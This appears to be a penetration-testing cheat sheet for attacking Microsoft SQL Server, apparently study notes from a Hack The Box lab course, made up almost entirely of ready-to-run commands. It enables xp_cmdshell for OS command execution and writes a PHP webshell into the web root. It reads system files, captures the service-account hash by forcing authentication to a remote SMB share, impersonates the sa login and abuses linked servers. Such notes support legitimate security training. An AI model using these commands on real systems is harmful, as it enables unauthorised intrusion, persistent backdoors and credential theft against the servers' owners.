#### MSSQL
```bash
sqsh -S 10.129.20.13 -U username -P Password123
```
##### Enuermation
If we use sqlcmd, we will need to use GO after our query to execute the SQL syntax.
```powershell
1> SELECT name FROM master.dbo.sysdatabases
2> GO

1> USE htbusers
2> GO

1> SELECT table_name FROM htbusers.INFORMATION_SCHEMA.TABLES
2> GO

1> SELECT * FROM users
2> GO
```
##### XP_CMDSHELL
```powershell
1> xp_cmdshell 'whoami'
2> GO
```
Enable XP_CMDSHELL
```bash
EXECUTE sp_configure 'show advanced options', 1
GO
RECONFIGURE
GO
EXECUTE sp_configure 'xp_cmdshell', 1
GO  
RECONFIGURE
GO
```
##### Write local files
To write files using MSSQL, we need to enable Ole Automation Procedures, which requires admin privileges, and then execute some stored procedures to create the file:
```powershell
1> sp_configure 'show advanced options', 1
2> GO
3> RECONFIGURE
4> GO
5> sp_configure 'Ole Automation Procedures', 1
6> GO
7> RECONFIGURE
8> GO
```

```powershell
1> DECLARE @OLE INT
2> DECLARE @FileID INT
3> EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
4> EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
5> EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
6> EXECUTE sp_OADestroy @FileID
7> EXECUTE sp_OADestroy @OLE
8> GO
```
##### Read local files
```powershell
1> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
2> GO
```
##### Capture Service Account Hash
```powershell
1> EXEC master..xp_dirtree '\\10.10.110.17\share\'
2> GO
```

```powershell
1> EXEC master..xp_subdirs '\\10.10.110.17\share\'
2> GO
```
##### Impersonate Users
Identify available users
```powershell
1> SELECT distinct b.name
2> FROM sys.server_permissions a
3> INNER JOIN sys.server_principals b
4> ON a.grantor_principal_id = b.principal_id
5> WHERE a.permission_name = 'IMPERSONATE'
6> GO
```
Verify current user and role
```powershell
1> SELECT SYSTEM_USER
2> SELECT IS_SRVROLEMEMBER('sysadmin')
3> go
```
As the returned value `0` indicates, we do not have the sysadmin role, but we can impersonate the `sa` user.

IMPERSONATE
```powershell
1> EXECUTE AS LOGIN = 'sa'
2> SELECT SYSTEM_USER
3> SELECT IS_SRVROLEMEMBER('sysadmin')
4> GO
```
##### Communicate with linked services
```powershell
1> SELECT srvname, isremote FROM sysservers
2> GO

1> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
2> GO

1> EXECUTE('master..xp_dirtree ''\\10.10.110.17\share\''') AT [10.0.0.12\SQLEXPRESS]
2> GO
```